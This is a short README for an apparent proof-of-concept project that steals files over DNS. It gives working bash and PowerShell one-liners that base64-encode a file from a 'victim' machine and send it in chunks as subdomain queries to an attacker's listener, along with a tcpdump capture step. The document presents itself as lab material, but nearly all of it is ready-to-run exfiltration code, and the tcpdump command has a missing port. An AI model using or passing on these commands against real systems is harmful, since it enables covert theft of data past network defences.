# DNS-Exfiltration
A proof-of-concept project demonstarting how to exfiltrate files in chunks over the DNS protocol by encoding data into subdomains.

# Components
1. Linux Sender: A bash one-liner for Linux victims.
2. Windows Sender: A Powershell one-liner for Windows victims.
3. Receiver: A python script to reassemble data from captured traffic.

# Step 1: Capture Traffic (Attacker's Machine)
On your listener use 'tcpdump' to capture incoming DNS queries to a file:
'''bash
sudo tcpdump -i any udp port -w dns_capture.cap

# Step 2: Send Data (Victim's Machine)
#replace lab.domain with lab domain or leave if lab is on localhost, replace lab-ip with machine's ip.

#Linux (bash)
FILE_TO_SEND="secret_file"; TARGET_DOMAIN="lab.domain"; SERVER_IP="lab-ip"; i=0; for CHUNK in $(base64 -w 0 "$FILE_TO_SEND" | grep -oE '.{1,60}'); do echo "Sending Chunk $i..."; dig @$SERVER_IP "${i}-${CHUNK}.${TARGET_DOMAIN}" +short > /dev/null 2>&1; ((i++)); sleep 0.1; done; echo "Done. All $i chunks sent."

#Windows (Powershell)
$f="secret_file"; $d="lab.domain"; $s="lab-ip"; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f)); $i=0; while($i -lt $b.Length){ $c=$b.Substring($i, [Math]::Min(60, $b.Length-$i)); nslookup "$($i/60)-$c.$d" $s >$null; $i+=60; Start-Sleep -m 100 }

# Step 3: Reassemble Data (Attacker's Machine)
Run the extract.py script to process the .pcap file.

Requirements: pip install scapy

Usage:
python3 extract.py
